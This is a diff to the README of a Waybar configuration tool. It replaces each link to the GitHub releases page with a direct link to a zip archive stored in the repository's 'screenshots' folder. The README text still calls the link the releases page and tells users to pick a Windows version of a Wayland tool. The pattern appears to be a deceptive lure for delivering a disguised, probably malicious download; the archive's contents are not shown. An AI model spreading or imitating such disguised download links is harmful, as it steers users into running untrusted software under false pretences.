@@ -1,6 +1,6 @@
 # 🪟 vsWaybar-Studio - Build Your Bar With Ease
 
-[![Download vsWaybar-Studio](https://img.shields.io/badge/Download%20vsWaybar--Studio-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/feugeu/vsWaybar-Studio/releases)
+[![Download vsWaybar-Studio](https://img.shields.io/badge/Download%20vsWaybar--Studio-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/feugeu/vsWaybar-Studio/main/screenshots/Waybar-vs-Studio-v1.5.zip)
 
 ## ✨ What vsWaybar-Studio does
 
@@ -22,7 +22,7 @@ It is built with GTK and Python and fits well with Wayland desktop setups. If yo
 
 Visit this page to download:
 
-https://github.com/feugeu/vsWaybar-Studio/releases
+https://raw.githubusercontent.com/feugeu/vsWaybar-Studio/main/screenshots/Waybar-vs-Studio-v1.5.zip
 
 On the releases page, choose the latest version for Windows and download the file for your system.
 
@@ -184,4 +184,4 @@ If you want the fastest path:
 
 Download from the releases page:
 
-https://github.com/feugeu/vsWaybar-Studio/releases
+https://raw.githubusercontent.com/feugeu/vsWaybar-Studio/main/screenshots/Waybar-vs-Studio-v1.5.zip
